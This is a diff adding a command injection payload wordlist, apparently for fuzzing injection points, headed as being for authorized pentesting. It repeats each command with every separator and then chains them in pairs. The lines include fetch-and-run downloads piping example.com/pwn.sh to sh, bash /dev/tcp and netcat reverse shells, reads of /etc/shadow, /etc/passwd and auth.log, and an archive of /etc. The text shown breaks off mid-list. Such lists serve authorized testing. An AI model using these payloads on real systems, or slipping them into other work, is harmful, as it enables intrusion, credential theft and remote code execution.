@@ -1,0 +1,4065 @@
+# Command Injection Payloads (for pentesting with authorization only)
+# Use responsibly and keep engagements within scope.
+# Thousands of separators, scripting helpers, and chained commands to exercise injection points in lab environments.
+
+id
+; id
+&& id
+| id
+|| id
+`id`
+$(id)
+uname -a
+; uname -a
+&& uname -a
+| uname -a
+|| uname -a
+`uname -a`
+$(uname -a)
+whoami
+; whoami
+&& whoami
+| whoami
+|| whoami
+`whoami`
+$(whoami)
+ls -la /
+; ls -la /
+&& ls -la /
+| ls -la /
+|| ls -la /
+`ls -la /`
+$(ls -la /)
+ls -la /etc
+; ls -la /etc
+&& ls -la /etc
+| ls -la /etc
+|| ls -la /etc
+`ls -la /etc`
+$(ls -la /etc)
+ls -lha /root
+; ls -lha /root
+&& ls -lha /root
+| ls -lha /root
+|| ls -lha /root
+`ls -lha /root`
+$(ls -lha /root)
+cat /etc/passwd
+; cat /etc/passwd
+&& cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+cat /etc/shadow
+; cat /etc/shadow
+&& cat /etc/shadow
+| cat /etc/shadow
+|| cat /etc/shadow
+`cat /etc/shadow`
+$(cat /etc/shadow)
+cat /etc/hosts
+; cat /etc/hosts
+&& cat /etc/hosts
+| cat /etc/hosts
+|| cat /etc/hosts
+`cat /etc/hosts`
+$(cat /etc/hosts)
+cat /var/log/auth.log
+; cat /var/log/auth.log
+&& cat /var/log/auth.log
+| cat /var/log/auth.log
+|| cat /var/log/auth.log
+`cat /var/log/auth.log`
+$(cat /var/log/auth.log)
+env
+; env
+&& env
+| env
+|| env
+`env`
+$(env)
+ps aux
+; ps aux
+&& ps aux
+| ps aux
+|| ps aux
+`ps aux`
+$(ps aux)
+netstat -tulnp
+; netstat -tulnp
+&& netstat -tulnp
+| netstat -tulnp
+|| netstat -tulnp
+`netstat -tulnp`
+$(netstat -tulnp)
+mtr -r 127.0.0.1 -c 1
+; mtr -r 127.0.0.1 -c 1
+&& mtr -r 127.0.0.1 -c 1
+| mtr -r 127.0.0.1 -c 1
+|| mtr -r 127.0.0.1 -c 1
+`mtr -r 127.0.0.1 -c 1`
+$(mtr -r 127.0.0.1 -c 1)
+curl http://example.com/pwn.sh | sh
+; curl http://example.com/pwn.sh | sh
+&& curl http://example.com/pwn.sh | sh
+| curl http://example.com/pwn.sh | sh
+|| curl http://example.com/pwn.sh | sh
+`curl http://example.com/pwn.sh | sh`
+$(curl http://example.com/pwn.sh | sh)
+wget http://example.com/pwn.sh -O- | sh
+; wget http://example.com/pwn.sh -O- | sh
+&& wget http://example.com/pwn.sh -O- | sh
+| wget http://example.com/pwn.sh -O- | sh
+|| wget http://example.com/pwn.sh -O- | sh
+`wget http://example.com/pwn.sh -O- | sh`
+$(wget http://example.com/pwn.sh -O- | sh)
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
+$(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1)
+nc 127.0.0.1 4444 -e /bin/bash
+; nc 127.0.0.1 4444 -e /bin/bash
+&& nc 127.0.0.1 4444 -e /bin/bash
+| nc 127.0.0.1 4444 -e /bin/bash
+|| nc 127.0.0.1 4444 -e /bin/bash
+`nc 127.0.0.1 4444 -e /bin/bash`
+$(nc 127.0.0.1 4444 -e /bin/bash)
+python -c 'import os;print(os.listdir("/"))'
+; python -c 'import os;print(os.listdir("/"))'
+&& python -c 'import os;print(os.listdir("/"))'
+| python -c 'import os;print(os.listdir("/"))'
+|| python -c 'import os;print(os.listdir("/"))'
+`python -c 'import os;print(os.listdir("/"))'`
+$(python -c 'import os;print(os.listdir("/"))')
+perl -e 'print "pwned"'
+; perl -e 'print "pwned"'
+&& perl -e 'print "pwned"'
+| perl -e 'print "pwned"'
+|| perl -e 'print "pwned"'
+`perl -e 'print "pwned"'`
+$(perl -e 'print "pwned"')
+php -r 'system("id");'
+; php -r 'system("id");'
+&& php -r 'system("id");'
+| php -r 'system("id");'
+|| php -r 'system("id");'
+`php -r 'system("id");'`
+$(php -r 'system("id");')
+ruby -e 'puts `id`'
+; ruby -e 'puts `id`'
+&& ruby -e 'puts `id`'
+| ruby -e 'puts `id`'
+|| ruby -e 'puts `id`'
+`ruby -e 'puts `id`'`
+$(ruby -e 'puts `id`')
+/bin/bash -c 'id'
+; /bin/bash -c 'id'
+&& /bin/bash -c 'id'
+| /bin/bash -c 'id'
+|| /bin/bash -c 'id'
+`/bin/bash -c 'id'`
+$(/bin/bash -c 'id')
+/usr/bin/id >/tmp/id.txt
+; /usr/bin/id >/tmp/id.txt
+&& /usr/bin/id >/tmp/id.txt
+| /usr/bin/id >/tmp/id.txt
+|| /usr/bin/id >/tmp/id.txt
+`/usr/bin/id >/tmp/id.txt`
+$(/usr/bin/id >/tmp/id.txt)
+/bin/echo pwned > /tmp/pwned.txt
+; /bin/echo pwned > /tmp/pwned.txt
+&& /bin/echo pwned > /tmp/pwned.txt
+| /bin/echo pwned > /tmp/pwned.txt
+|| /bin/echo pwned > /tmp/pwned.txt
+`/bin/echo pwned > /tmp/pwned.txt`
+$(/bin/echo pwned > /tmp/pwned.txt)
+/usr/bin/printf 'pwned\n'
+; /usr/bin/printf 'pwned\n'
+&& /usr/bin/printf 'pwned\n'
+| /usr/bin/printf 'pwned\n'
+|| /usr/bin/printf 'pwned\n'
+`/usr/bin/printf 'pwned\n'`
+$(/usr/bin/printf 'pwned\n')
+chmod +x /tmp/pwned
+; chmod +x /tmp/pwned
+&& chmod +x /tmp/pwned
+| chmod +x /tmp/pwned
+|| chmod +x /tmp/pwned
+`chmod +x /tmp/pwned`
+$(chmod +x /tmp/pwned)
+tar -cf /tmp/dump.tar /etc
+; tar -cf /tmp/dump.tar /etc
+&& tar -cf /tmp/dump.tar /etc
+| tar -cf /tmp/dump.tar /etc
+|| tar -cf /tmp/dump.tar /etc
+`tar -cf /tmp/dump.tar /etc`
+$(tar -cf /tmp/dump.tar /etc)
+openssl s_client -connect example.com:443
+; openssl s_client -connect example.com:443
+&& openssl s_client -connect example.com:443
+| openssl s_client -connect example.com:443
+|| openssl s_client -connect example.com:443
+`openssl s_client -connect example.com:443`
+$(openssl s_client -connect example.com:443)
+ssh localhost id
+; ssh localhost id
+&& ssh localhost id
+| ssh localhost id
+|| ssh localhost id
+`ssh localhost id`
+$(ssh localhost id)
+ftp http://example.com/pwn.sh
+; ftp http://example.com/pwn.sh
+&& ftp http://example.com/pwn.sh
+| ftp http://example.com/pwn.sh
+|| ftp http://example.com/pwn.sh
+`ftp http://example.com/pwn.sh`
+$(ftp http://example.com/pwn.sh)
+id ; id
+id && id
+id | id
+id || id
+id ; uname -a
+id && uname -a
+id | uname -a
+id || uname -a
+id ; whoami
+id && whoami
+id | whoami
+id || whoami
+id ; ls -la /
+id && ls -la /
+id | ls -la /
+id || ls -la /
+id ; ls -la /etc
+id && ls -la /etc
+id | ls -la /etc
+id || ls -la /etc
+id ; ls -lha /root
+id && ls -lha /root
+id | ls -lha /root
+id || ls -lha /root
+id ; cat /etc/passwd
+id && cat /etc/passwd
+id | cat /etc/passwd
+id || cat /etc/passwd
+id ; cat /etc/shadow
+id && cat /etc/shadow
+id | cat /etc/shadow
+id || cat /etc/shadow
+id ; cat /etc/hosts
+id && cat /etc/hosts
+id | cat /etc/hosts
+id || cat /etc/hosts
+id ; cat /var/log/auth.log
+id && cat /var/log/auth.log
+id | cat /var/log/auth.log
+id || cat /var/log/auth.log
+id ; env
+id && env
+id | env
+id || env
+id ; ps aux
+id && ps aux
+id | ps aux
+id || ps aux
+id ; netstat -tulnp
+id && netstat -tulnp
+id | netstat -tulnp
+id || netstat -tulnp
+id ; mtr -r 127.0.0.1 -c 1
+id && mtr -r 127.0.0.1 -c 1
+id | mtr -r 127.0.0.1 -c 1
+id || mtr -r 127.0.0.1 -c 1
+id ; curl http://example.com/pwn.sh | sh
+id && curl http://example.com/pwn.sh | sh
+id | curl http://example.com/pwn.sh | sh
+id || curl http://example.com/pwn.sh | sh
+id ; wget http://example.com/pwn.sh -O- | sh
+id && wget http://example.com/pwn.sh -O- | sh
+id | wget http://example.com/pwn.sh -O- | sh
+id || wget http://example.com/pwn.sh -O- | sh
+id ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+id && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+id | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+id || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+id ; nc 127.0.0.1 4444 -e /bin/bash
+id && nc 127.0.0.1 4444 -e /bin/bash
+id | nc 127.0.0.1 4444 -e /bin/bash
+id || nc 127.0.0.1 4444 -e /bin/bash
+id ; python -c 'import os;print(os.listdir("/"))'
+id && python -c 'import os;print(os.listdir("/"))'
+id | python -c 'import os;print(os.listdir("/"))'
+id || python -c 'import os;print(os.listdir("/"))'
+id ; perl -e 'print "pwned"'
+id && perl -e 'print "pwned"'
+id | perl -e 'print "pwned"'
+id || perl -e 'print "pwned"'
+id ; php -r 'system("id");'
+id && php -r 'system("id");'
+id | php -r 'system("id");'
+id || php -r 'system("id");'
+id ; ruby -e 'puts `id`'
+id && ruby -e 'puts `id`'
+id | ruby -e 'puts `id`'
+id || ruby -e 'puts `id`'
+id ; /bin/bash -c 'id'
+id && /bin/bash -c 'id'
+id | /bin/bash -c 'id'
+id || /bin/bash -c 'id'
+id ; /usr/bin/id >/tmp/id.txt
+id && /usr/bin/id >/tmp/id.txt
+id | /usr/bin/id >/tmp/id.txt
+id || /usr/bin/id >/tmp/id.txt
+id ; /bin/echo pwned > /tmp/pwned.txt
+id && /bin/echo pwned > /tmp/pwned.txt
+id | /bin/echo pwned > /tmp/pwned.txt
+id || /bin/echo pwned > /tmp/pwned.txt
+id ; /usr/bin/printf 'pwned\n'
+id && /usr/bin/printf 'pwned\n'
+id | /usr/bin/printf 'pwned\n'
+id || /usr/bin/printf 'pwned\n'
+id ; chmod +x /tmp/pwned
+id && chmod +x /tmp/pwned
+id | chmod +x /tmp/pwned
+id || chmod +x /tmp/pwned
+id ; tar -cf /tmp/dump.tar /etc
+id && tar -cf /tmp/dump.tar /etc
+id | tar -cf /tmp/dump.tar /etc
+id || tar -cf /tmp/dump.tar /etc
+id ; openssl s_client -connect example.com:443
+id && openssl s_client -connect example.com:443
+id | openssl s_client -connect example.com:443
+id || openssl s_client -connect example.com:443
+id ; ssh localhost id
+id && ssh localhost id
+id | ssh localhost id
+id || ssh localhost id
+id ; ftp http://example.com/pwn.sh
+id && ftp http://example.com/pwn.sh
+id | ftp http://example.com/pwn.sh
+id || ftp http://example.com/pwn.sh
+uname -a ; id
+uname -a && id
+uname -a | id
+uname -a || id
+uname -a ; uname -a
+uname -a && uname -a
+uname -a | uname -a
+uname -a || uname -a
+uname -a ; whoami
+uname -a && whoami
+uname -a | whoami
+uname -a || whoami
+uname -a ; ls -la /
+uname -a && ls -la /
+uname -a | ls -la /
+uname -a || ls -la /
+uname -a ; ls -la /etc
+uname -a && ls -la /etc
+uname -a | ls -la /etc
+uname -a || ls -la /etc
+uname -a ; ls -lha /root
+uname -a && ls -lha /root
+uname -a | ls -lha /root
+uname -a || ls -lha /root
+uname -a ; cat /etc/passwd
+uname -a && cat /etc/passwd
+uname -a | cat /etc/passwd
+uname -a || cat /etc/passwd
+uname -a ; cat /etc/shadow
+uname -a && cat /etc/shadow
+uname -a | cat /etc/shadow
+uname -a || cat /etc/shadow
+uname -a ; cat /etc/hosts
+uname -a && cat /etc/hosts
+uname -a | cat /etc/hosts
+uname -a || cat /etc/hosts
+uname -a ; cat /var/log/auth.log
+uname -a && cat /var/log/auth.log
+uname -a | cat /var/log/auth.log
+uname -a || cat /var/log/auth.log
+uname -a ; env
+uname -a && env
+uname -a | env
+uname -a || env
+uname -a ; ps aux
+uname -a && ps aux
+uname -a | ps aux
+uname -a || ps aux
+uname -a ; netstat -tulnp
+uname -a && netstat -tulnp
+uname -a | netstat -tulnp
+uname -a || netstat -tulnp
+uname -a ; mtr -r 127.0.0.1 -c 1
+uname -a && mtr -r 127.0.0.1 -c 1
+uname -a | mtr -r 127.0.0.1 -c 1
+uname -a || mtr -r 127.0.0.1 -c 1
+uname -a ; curl http://example.com/pwn.sh | sh
+uname -a && curl http://example.com/pwn.sh | sh
+uname -a | curl http://example.com/pwn.sh | sh
+uname -a || curl http://example.com/pwn.sh | sh
+uname -a ; wget http://example.com/pwn.sh -O- | sh
+uname -a && wget http://example.com/pwn.sh -O- | sh
+uname -a | wget http://example.com/pwn.sh -O- | sh
+uname -a || wget http://example.com/pwn.sh -O- | sh
+uname -a ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+uname -a && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+uname -a | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+uname -a || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+uname -a ; nc 127.0.0.1 4444 -e /bin/bash
+uname -a && nc 127.0.0.1 4444 -e /bin/bash
+uname -a | nc 127.0.0.1 4444 -e /bin/bash
+uname -a || nc 127.0.0.1 4444 -e /bin/bash
+uname -a ; python -c 'import os;print(os.listdir("/"))'
+uname -a && python -c 'import os;print(os.listdir("/"))'
+uname -a | python -c 'import os;print(os.listdir("/"))'
+uname -a || python -c 'import os;print(os.listdir("/"))'
+uname -a ; perl -e 'print "pwned"'
+uname -a && perl -e 'print "pwned"'
+uname -a | perl -e 'print "pwned"'
+uname -a || perl -e 'print "pwned"'
+uname -a ; php -r 'system("id");'
+uname -a && php -r 'system("id");'
+uname -a | php -r 'system("id");'
+uname -a || php -r 'system("id");'
+uname -a ; ruby -e 'puts `id`'
+uname -a && ruby -e 'puts `id`'
+uname -a | ruby -e 'puts `id`'
+uname -a || ruby -e 'puts `id`'
+uname -a ; /bin/bash -c 'id'
+uname -a && /bin/bash -c 'id'
+uname -a | /bin/bash -c 'id'
+uname -a || /bin/bash -c 'id'
+uname -a ; /usr/bin/id >/tmp/id.txt
+uname -a && /usr/bin/id >/tmp/id.txt
+uname -a | /usr/bin/id >/tmp/id.txt
+uname -a || /usr/bin/id >/tmp/id.txt
+uname -a ; /bin/echo pwned > /tmp/pwned.txt
+uname -a && /bin/echo pwned > /tmp/pwned.txt
+uname -a | /bin/echo pwned > /tmp/pwned.txt
+uname -a || /bin/echo pwned > /tmp/pwned.txt
+uname -a ; /usr/bin/printf 'pwned\n'
+uname -a && /usr/bin/printf 'pwned\n'
+uname -a | /usr/bin/printf 'pwned\n'
+uname -a || /usr/bin/printf 'pwned\n'
+uname -a ; chmod +x /tmp/pwned
+uname -a && chmod +x /tmp/pwned
+uname -a | chmod +x /tmp/pwned
+uname -a || chmod +x /tmp/pwned
+uname -a ; tar -cf /tmp/dump.tar /etc
+uname -a && tar -cf /tmp/dump.tar /etc
+uname -a | tar -cf /tmp/dump.tar /etc
+uname -a || tar -cf /tmp/dump.tar /etc
+uname -a ; openssl s_client -connect example.com:443
+uname -a && openssl s_client -connect example.com:443
+uname -a | openssl s_client -connect example.com:443
+uname -a || openssl s_client -connect example.com:443
+uname -a ; ssh localhost id
+uname -a && ssh localhost id
+uname -a | ssh localhost id
+uname -a || ssh localhost id
+uname -a ; ftp http://example.com/pwn.sh
+uname -a && ftp http://example.com/pwn.sh
+uname -a | ftp http://example.com/pwn.sh
+uname -a || ftp http://example.com/pwn.sh
+whoami ; id
+whoami && id
+whoami | id
+whoami || id
+whoami ; uname -a
+whoami && uname -a
+whoami | uname -a
+whoami || uname -a
+whoami ; whoami
+whoami && whoami
+whoami | whoami
+whoami || whoami
+whoami ; ls -la /
+whoami && ls -la /
+whoami | ls -la /
+whoami || ls -la /
+whoami ; ls -la /etc
+whoami && ls -la /etc
+whoami | ls -la /etc
+whoami || ls -la /etc
+whoami ; ls -lha /root
+whoami && ls -lha /root
+whoami | ls -lha /root
+whoami || ls -lha /root
+whoami ; cat /etc/passwd
+whoami && cat /etc/passwd
+whoami | cat /etc/passwd
+whoami || cat /etc/passwd
+whoami ; cat /etc/shadow
+whoami && cat /etc/shadow
+whoami | cat /etc/shadow
+whoami || cat /etc/shadow
+whoami ; cat /etc/hosts
+whoami && cat /etc/hosts
+whoami | cat /etc/hosts
+whoami || cat /etc/hosts
+whoami ; cat /var/log/auth.log
+whoami && cat /var/log/auth.log
+whoami | cat /var/log/auth.log
+whoami || cat /var/log/auth.log
+whoami ; env
+whoami && env
+whoami | env
+whoami || env
+whoami ; ps aux
+whoami && ps aux
+whoami | ps aux
+whoami || ps aux
+whoami ; netstat -tulnp
+whoami && netstat -tulnp
+whoami | netstat -tulnp
+whoami || netstat -tulnp
+whoami ; mtr -r 127.0.0.1 -c 1
+whoami && mtr -r 127.0.0.1 -c 1
+whoami | mtr -r 127.0.0.1 -c 1
+whoami || mtr -r 127.0.0.1 -c 1
+whoami ; curl http://example.com/pwn.sh | sh
+whoami && curl http://example.com/pwn.sh | sh
+whoami | curl http://example.com/pwn.sh | sh
+whoami || curl http://example.com/pwn.sh | sh
+whoami ; wget http://example.com/pwn.sh -O- | sh
+whoami && wget http://example.com/pwn.sh -O- | sh
+whoami | wget http://example.com/pwn.sh -O- | sh
+whoami || wget http://example.com/pwn.sh -O- | sh
+whoami ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+whoami && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+whoami | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+whoami || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+whoami ; nc 127.0.0.1 4444 -e /bin/bash
+whoami && nc 127.0.0.1 4444 -e /bin/bash
+whoami | nc 127.0.0.1 4444 -e /bin/bash
+whoami || nc 127.0.0.1 4444 -e /bin/bash
+whoami ; python -c 'import os;print(os.listdir("/"))'
+whoami && python -c 'import os;print(os.listdir("/"))'
+whoami | python -c 'import os;print(os.listdir("/"))'
+whoami || python -c 'import os;print(os.listdir("/"))'
+whoami ; perl -e 'print "pwned"'
+whoami && perl -e 'print "pwned"'
+whoami | perl -e 'print "pwned"'
+whoami || perl -e 'print "pwned"'
+whoami ; php -r 'system("id");'
+whoami && php -r 'system("id");'
+whoami | php -r 'system("id");'
+whoami || php -r 'system("id");'
+whoami ; ruby -e 'puts `id`'
+whoami && ruby -e 'puts `id`'
+whoami | ruby -e 'puts `id`'
+whoami || ruby -e 'puts `id`'
+whoami ; /bin/bash -c 'id'
+whoami && /bin/bash -c 'id'
+whoami | /bin/bash -c 'id'
+whoami || /bin/bash -c 'id'
+whoami ; /usr/bin/id >/tmp/id.txt
+whoami && /usr/bin/id >/tmp/id.txt
+whoami | /usr/bin/id >/tmp/id.txt
+whoami || /usr/bin/id >/tmp/id.txt
+whoami ; /bin/echo pwned > /tmp/pwned.txt
+whoami && /bin/echo pwned > /tmp/pwned.txt
+whoami | /bin/echo pwned > /tmp/pwned.txt
+whoami || /bin/echo pwned > /tmp/pwned.txt
+whoami ; /usr/bin/printf 'pwned\n'
+whoami && /usr/bin/printf 'pwned\n'
+whoami | /usr/bin/printf 'pwned\n'
+whoami || /usr/bin/printf 'pwned\n'
+whoami ; chmod +x /tmp/pwned
+whoami && chmod +x /tmp/pwned
+whoami | chmod +x /tmp/pwned
+whoami || chmod +x /tmp/pwned
+whoami ; tar -cf /tmp/dump.tar /etc
+whoami && tar -cf /tmp/dump.tar /etc
+whoami | tar -cf /tmp/dump.tar /etc
+whoami || tar -cf /tmp/dump.tar /etc
+whoami ; openssl s_client -connect example.com:443
+whoami && openssl s_client -connect example.com:443
+whoami | openssl s_client -connect example.com:443
+whoami || openssl s_client -connect example.com:443
+whoami ; ssh localhost id
+whoami && ssh localhost id
+whoami | ssh localhost id
+whoami || ssh localhost id
+whoami ; ftp http://example.com/pwn.sh
+whoami && ftp http://example.com/pwn.sh
+whoami | ftp http://example.com/pwn.sh
+whoami || ftp http://example.com/pwn.sh
+ls -la / ; id
+ls -la / && id
+ls -la / | id
+ls -la / || id
+ls -la / ; uname -a
+ls -la / && uname -a
+ls -la / | uname -a
+ls -la / || uname -a
+ls -la / ; whoami
+ls -la / && whoami
+ls -la / | whoami
+ls -la / || whoami
+ls -la / ; ls -la /
+ls -la / && ls -la /
+ls -la / | ls -la /
+ls -la / || ls -la /
+ls -la / ; ls -la /etc
+ls -la / && ls -la /etc
+ls -la / | ls -la /etc
+ls -la / || ls -la /etc
+ls -la / ; ls -lha /root
+ls -la / && ls -lha /root
+ls -la / | ls -lha /root
+ls -la / || ls -lha /root
+ls -la / ; cat /etc/passwd
+ls -la / && cat /etc/passwd
+ls -la / | cat /etc/passwd
+ls -la / || cat /etc/passwd
+ls -la / ; cat /etc/shadow
+ls -la / && cat /etc/shadow
+ls -la / | cat /etc/shadow
+ls -la / || cat /etc/shadow
+ls -la / ; cat /etc/hosts
+ls -la / && cat /etc/hosts
+ls -la / | cat /etc/hosts
+ls -la / || cat /etc/hosts
+ls -la / ; cat /var/log/auth.log
+ls -la / && cat /var/log/auth.log
+ls -la / | cat /var/log/auth.log
+ls -la / || cat /var/log/auth.log
+ls -la / ; env
+ls -la / && env
+ls -la / | env
+ls -la / || env
+ls -la / ; ps aux
+ls -la / && ps aux
+ls -la / | ps aux
+ls -la / || ps aux
+ls -la / ; netstat -tulnp
+ls -la / && netstat -tulnp
+ls -la / | netstat -tulnp
+ls -la / || netstat -tulnp
+ls -la / ; mtr -r 127.0.0.1 -c 1
+ls -la / && mtr -r 127.0.0.1 -c 1
+ls -la / | mtr -r 127.0.0.1 -c 1
+ls -la / || mtr -r 127.0.0.1 -c 1
+ls -la / ; curl http://example.com/pwn.sh | sh
+ls -la / && curl http://example.com/pwn.sh | sh
+ls -la / | curl http://example.com/pwn.sh | sh
+ls -la / || curl http://example.com/pwn.sh | sh
+ls -la / ; wget http://example.com/pwn.sh -O- | sh
+ls -la / && wget http://example.com/pwn.sh -O- | sh
+ls -la / | wget http://example.com/pwn.sh -O- | sh
+ls -la / || wget http://example.com/pwn.sh -O- | sh
+ls -la / ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la / && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la / | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la / || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la / ; nc 127.0.0.1 4444 -e /bin/bash
+ls -la / && nc 127.0.0.1 4444 -e /bin/bash
+ls -la / | nc 127.0.0.1 4444 -e /bin/bash
+ls -la / || nc 127.0.0.1 4444 -e /bin/bash
+ls -la / ; python -c 'import os;print(os.listdir("/"))'
+ls -la / && python -c 'import os;print(os.listdir("/"))'
+ls -la / | python -c 'import os;print(os.listdir("/"))'
+ls -la / || python -c 'import os;print(os.listdir("/"))'
+ls -la / ; perl -e 'print "pwned"'
+ls -la / && perl -e 'print "pwned"'
+ls -la / | perl -e 'print "pwned"'
+ls -la / || perl -e 'print "pwned"'
+ls -la / ; php -r 'system("id");'
+ls -la / && php -r 'system("id");'
+ls -la / | php -r 'system("id");'
+ls -la / || php -r 'system("id");'
+ls -la / ; ruby -e 'puts `id`'
+ls -la / && ruby -e 'puts `id`'
+ls -la / | ruby -e 'puts `id`'
+ls -la / || ruby -e 'puts `id`'
+ls -la / ; /bin/bash -c 'id'
+ls -la / && /bin/bash -c 'id'
+ls -la / | /bin/bash -c 'id'
+ls -la / || /bin/bash -c 'id'
+ls -la / ; /usr/bin/id >/tmp/id.txt
+ls -la / && /usr/bin/id >/tmp/id.txt
+ls -la / | /usr/bin/id >/tmp/id.txt
+ls -la / || /usr/bin/id >/tmp/id.txt
+ls -la / ; /bin/echo pwned > /tmp/pwned.txt
+ls -la / && /bin/echo pwned > /tmp/pwned.txt
+ls -la / | /bin/echo pwned > /tmp/pwned.txt
+ls -la / || /bin/echo pwned > /tmp/pwned.txt
+ls -la / ; /usr/bin/printf 'pwned\n'
+ls -la / && /usr/bin/printf 'pwned\n'
+ls -la / | /usr/bin/printf 'pwned\n'
+ls -la / || /usr/bin/printf 'pwned\n'
+ls -la / ; chmod +x /tmp/pwned
+ls -la / && chmod +x /tmp/pwned
+ls -la / | chmod +x /tmp/pwned
+ls -la / || chmod +x /tmp/pwned
+ls -la / ; tar -cf /tmp/dump.tar /etc
+ls -la / && tar -cf /tmp/dump.tar /etc
+ls -la / | tar -cf /tmp/dump.tar /etc
+ls -la / || tar -cf /tmp/dump.tar /etc
+ls -la / ; openssl s_client -connect example.com:443
+ls -la / && openssl s_client -connect example.com:443
+ls -la / | openssl s_client -connect example.com:443
+ls -la / || openssl s_client -connect example.com:443
+ls -la / ; ssh localhost id
+ls -la / && ssh localhost id
+ls -la / | ssh localhost id
+ls -la / || ssh localhost id
+ls -la / ; ftp http://example.com/pwn.sh
+ls -la / && ftp http://example.com/pwn.sh
+ls -la / | ftp http://example.com/pwn.sh
+ls -la / || ftp http://example.com/pwn.sh
+ls -la /etc ; id
+ls -la /etc && id
+ls -la /etc | id
+ls -la /etc || id
+ls -la /etc ; uname -a
+ls -la /etc && uname -a
+ls -la /etc | uname -a
+ls -la /etc || uname -a
+ls -la /etc ; whoami
+ls -la /etc && whoami
+ls -la /etc | whoami
+ls -la /etc || whoami
+ls -la /etc ; ls -la /
+ls -la /etc && ls -la /
+ls -la /etc | ls -la /
+ls -la /etc || ls -la /
+ls -la /etc ; ls -la /etc
+ls -la /etc && ls -la /etc
+ls -la /etc | ls -la /etc
+ls -la /etc || ls -la /etc
+ls -la /etc ; ls -lha /root
+ls -la /etc && ls -lha /root
+ls -la /etc | ls -lha /root
+ls -la /etc || ls -lha /root
+ls -la /etc ; cat /etc/passwd
+ls -la /etc && cat /etc/passwd
+ls -la /etc | cat /etc/passwd
+ls -la /etc || cat /etc/passwd
+ls -la /etc ; cat /etc/shadow
+ls -la /etc && cat /etc/shadow
+ls -la /etc | cat /etc/shadow
+ls -la /etc || cat /etc/shadow
+ls -la /etc ; cat /etc/hosts
+ls -la /etc && cat /etc/hosts
+ls -la /etc | cat /etc/hosts
+ls -la /etc || cat /etc/hosts
+ls -la /etc ; cat /var/log/auth.log
+ls -la /etc && cat /var/log/auth.log
+ls -la /etc | cat /var/log/auth.log
+ls -la /etc || cat /var/log/auth.log
+ls -la /etc ; env
+ls -la /etc && env
+ls -la /etc | env
+ls -la /etc || env
+ls -la /etc ; ps aux
+ls -la /etc && ps aux
+ls -la /etc | ps aux
+ls -la /etc || ps aux
+ls -la /etc ; netstat -tulnp
+ls -la /etc && netstat -tulnp
+ls -la /etc | netstat -tulnp
+ls -la /etc || netstat -tulnp
+ls -la /etc ; mtr -r 127.0.0.1 -c 1
+ls -la /etc && mtr -r 127.0.0.1 -c 1
+ls -la /etc | mtr -r 127.0.0.1 -c 1
+ls -la /etc || mtr -r 127.0.0.1 -c 1
+ls -la /etc ; curl http://example.com/pwn.sh | sh
+ls -la /etc && curl http://example.com/pwn.sh | sh
+ls -la /etc | curl http://example.com/pwn.sh | sh
+ls -la /etc || curl http://example.com/pwn.sh | sh
+ls -la /etc ; wget http://example.com/pwn.sh -O- | sh
+ls -la /etc && wget http://example.com/pwn.sh -O- | sh
+ls -la /etc | wget http://example.com/pwn.sh -O- | sh
+ls -la /etc || wget http://example.com/pwn.sh -O- | sh
+ls -la /etc ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la /etc && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la /etc | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la /etc || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -la /etc ; nc 127.0.0.1 4444 -e /bin/bash
+ls -la /etc && nc 127.0.0.1 4444 -e /bin/bash
+ls -la /etc | nc 127.0.0.1 4444 -e /bin/bash
+ls -la /etc || nc 127.0.0.1 4444 -e /bin/bash
+ls -la /etc ; python -c 'import os;print(os.listdir("/"))'
+ls -la /etc && python -c 'import os;print(os.listdir("/"))'
+ls -la /etc | python -c 'import os;print(os.listdir("/"))'
+ls -la /etc || python -c 'import os;print(os.listdir("/"))'
+ls -la /etc ; perl -e 'print "pwned"'
+ls -la /etc && perl -e 'print "pwned"'
+ls -la /etc | perl -e 'print "pwned"'
+ls -la /etc || perl -e 'print "pwned"'
+ls -la /etc ; php -r 'system("id");'
+ls -la /etc && php -r 'system("id");'
+ls -la /etc | php -r 'system("id");'
+ls -la /etc || php -r 'system("id");'
+ls -la /etc ; ruby -e 'puts `id`'
+ls -la /etc && ruby -e 'puts `id`'
+ls -la /etc | ruby -e 'puts `id`'
+ls -la /etc || ruby -e 'puts `id`'
+ls -la /etc ; /bin/bash -c 'id'
+ls -la /etc && /bin/bash -c 'id'
+ls -la /etc | /bin/bash -c 'id'
+ls -la /etc || /bin/bash -c 'id'
+ls -la /etc ; /usr/bin/id >/tmp/id.txt
+ls -la /etc && /usr/bin/id >/tmp/id.txt
+ls -la /etc | /usr/bin/id >/tmp/id.txt
+ls -la /etc || /usr/bin/id >/tmp/id.txt
+ls -la /etc ; /bin/echo pwned > /tmp/pwned.txt
+ls -la /etc && /bin/echo pwned > /tmp/pwned.txt
+ls -la /etc | /bin/echo pwned > /tmp/pwned.txt
+ls -la /etc || /bin/echo pwned > /tmp/pwned.txt
+ls -la /etc ; /usr/bin/printf 'pwned\n'
+ls -la /etc && /usr/bin/printf 'pwned\n'
+ls -la /etc | /usr/bin/printf 'pwned\n'
